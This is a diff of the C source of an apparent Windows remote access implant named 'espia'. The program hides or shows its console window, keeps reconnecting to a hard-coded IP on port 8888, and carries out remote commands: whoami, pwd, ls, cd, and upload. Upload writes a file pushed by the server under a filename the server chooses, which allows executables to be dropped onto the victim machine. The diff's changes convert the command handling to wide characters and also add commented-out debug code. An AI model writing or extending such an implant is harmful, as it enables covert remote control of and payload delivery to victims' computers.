@@ -20,61 +20,96 @@ int main() {
 	ShowWindow(stealth, SW_NORMAL);
     /* ------------------------------------------- */
 
+    //wchar_t testarr[3] = L"ab";
+    //char chararr[6] = "\x61\x00\x62\x00\x00";
+    //printf("%ls, %d, %d\n", testarr, wcslen(testarr), sizeof(testarr));
+    //for (int i = 0 ; i < sizeof(testarr) ; i++) printf("[%c]", *(((char *)testarr) + i));
+    //printf("\n");
+    //for (int i = 0 ; i < sizeof(testarr) ; i++) printf("[%c]", *(testarr + i));
+    //printf("\n");
+    //for (int i = 0 ; i < sizeof(testarr) ; i++) printf("[%02x]", *(((char *)testarr) + i));
+    //printf("\n");
+    //printf("%ls, %d, %d\n", (wchar_t *)chararr, wcslen((wchar_t *)chararr), sizeof(chararr));
+    //for (int i = 0 ; i < sizeof(chararr) ; i++) printf("[%c]", *(((char *)chararr) + i));
+    //printf("\n");
+    //for (int i = 0 ; i < sizeof(chararr) ; i++) printf("[%c]", *(chararr + i));
+    //printf("\n");
+    //for (int i = 0 ; i < sizeof(chararr) ; i++) printf("[%02x]", *(((char *)chararr) + i));
+    //printf("\n");
+    //char norm[6] = "abcd";
+    //printf("%ls, %d, %d\n", chararr, strlen(chararr), sizeof(chararr));
+    //for (int i = 0 ; i < sizeof(norm) ; i++) printf("[%c]", *(((char *)norm) + i));
+    //printf("\n");
+    //for (int i = 0 ; i < sizeof(norm) ; i++) printf("[%c]", *(norm + i));
+    //printf("\n");
+    //for (int i = 0 ; i < sizeof(norm) ; i++) printf("[%02x]", *(((char *)norm) + i));
+    //printf("\n");
+    //char chararr[6] = "\x61\x00\x62\x00\x00";
+    //HANDLE hfile = CreateFileW((WCHAR *)chararr, GENERIC_WRITE, FILE_SHARE_READ, NULL, CREATE_NEW, FILE_ATTRIBUTE_NORMAL, NULL);
+    //char chararr[] = "\x61\x00\x62\x00\x20\x00\x63\x00\x64\x00\x00";
+    //for (int i = 0 ; i < wcslen((WCHAR *)chararr) ; i++) {
+        //printf("[%lc] %d\n", *(((WCHAR *)chararr) + i), (*(((WCHAR *)chararr) + i) == L' '));
+    //}
 
     /* Keep trying to connect to the server */
 	WORD server_status;
-	while ((server_status = espia_connect("172.25.130.35", "8888")) == CONNECTION_FAIL)
+	while ((server_status = espia_connect("172.25.253.11", "8888")) == CONNECTION_FAIL)
 		Sleep(TRY_SERVER);
     /* ------------------------------------ */
 
 
     /* Main flow of the program, command recieving, parsing */
     CHAR recv_buff[BUFF_SIZE];
-    CHAR cmd_buff[BUFF_SIZE];
-    PSTR cmd_arg = NULL;
+    PWSTR recv_buffw;
+    WCHAR cmd_buff[BUFF_SIZE];
+    PWSTR cmd_arg = NULL;
     int cmd_size = -1;
     while (strcmp(recv_buff, "exit") && cmd_size != 0) {
         memset(recv_buff, 0, BUFF_SIZE);
         memset(cmd_buff, 0, BUFF_SIZE);
         cmd_arg = NULL;
         cmd_size = espia_recv(recv_buff, BUFF_SIZE);
-        printf("Recieved: %s\n", recv_buff);
-        //memset(recv_buff + cmd_size - 1, 0, 1);                     // Remove the breakline char ('\n')
+        recv_buffw = (PWSTR)recv_buff;
+        printf("Recieved: %ls, size: %d\n", recv_buffw, cmd_size);
 
         /* Seperate the command from argument using the whitespace (' ') */
         int i = 0;
         for (i = 0 ; i < cmd_size ; i++) {
-            if (recv_buff[i] == ' ') {
-                cmd_buff[i] = '\0';
-                cmd_arg = recv_buff + ++i;
+            if (*(recv_buffw + i) == L' ') {
+                cmd_buff[i] = L'\0';
+                cmd_arg = recv_buffw + ++i;
                 break;
             }
-            cmd_buff[i] = recv_buff[i];
+            cmd_buff[i] = *(recv_buffw + i);
         }
 
-        if (strcmp(cmd_buff, "whoami") == 0) {
+        printf("Command: %ls\n", cmd_buff);
+        printf("Argument: %ls\n", cmd_arg);
+
+        if (wcscmp(cmd_buff, L"whoami") == 0) {
             WCHAR whoami_buff[256 + MAX_COMPUTERNAME_LENGTH + 2];
             memset(whoami_buff, 0, sizeof(whoami_buff));
             whoami(whoami_buff, sizeof(whoami_buff));
             espia_send(whoami_buff, wcslen(whoami_buff)*sizeof(WCHAR));
-        } else if (strcmp(cmd_buff, "pwd") == 0) {
+        } else if (wcscmp(cmd_buff, L"pwd") == 0) {
             WCHAR pwd_buff[MAX_PATH + 1];
             memset(pwd_buff, 0, sizeof(pwd_buff));
             pwd(pwd_buff, sizeof(pwd_buff));
             StringCbCatW(pwd_buff, sizeof(pwd_buff), L"\n");
             espia_send(pwd_buff, wcslen(pwd_buff)*sizeof(WCHAR));
-        } else if (strcmp(cmd_buff, "ls") == 0) {
-            printf("came asdf");
+        } else if (wcscmp(cmd_buff, L"ls") == 0) {
             ls(espia_send);
-        } else if (strcmp(cmd_buff, "cd") == 0) {
+        } else if (wcscmp(cmd_buff, L"cd") == 0) {
             WCHAR err_buff[50];
             if (cd(cmd_arg, err_buff, sizeof(err_buff)) != ESPIA_OK) {
                 espia_send(err_buff, wcslen(err_buff)*sizeof(WCHAR));
             }
-        } else if (strcmp(cmd_buff, "upload") == 0) {
+        } else if (wcscmp(cmd_buff, L"upload") == 0) {
             WCHAR send_buff[9] = L"\0";
             CHAR write_file_buff[1024] = "\0";
             espia_recv(write_file_buff, sizeof(write_file_buff));
+
+            /* Converts the file size to int */
             int sum = 0, dig = 0, pow = strlen(write_file_buff) - 1;
             for (int i = 0 ; i < strlen(write_file_buff) ; i++) {
                 dig = write_file_buff[i] - '0';
@@ -88,7 +123,7 @@ int main() {
             espia_send(send_buff, sizeof(send_buff));
 
             HANDLE hFile = CreateFileW(
-                L"test.exe",     // Filename
+                cmd_arg,     // Filename
                 GENERIC_WRITE,          // Desired access
                 FILE_SHARE_READ,        // Share mode
                 NULL,                   // Security attributes
@@ -113,12 +148,10 @@ int main() {
                     NULL,    // Bytes written
                     nullptr);
                 full_bytes += recieved_bytes;
-                printf("%d\n", full_bytes);
             }
             continue;
         } else {
-            printf("%s : %d\n", recv_buff, cmd_size);
-            espia_send((PWSTR)recv_buff, cmd_size);
+            espia_send(recv_buffw, cmd_size);
         }
 
         WCHAR msg_end[6];
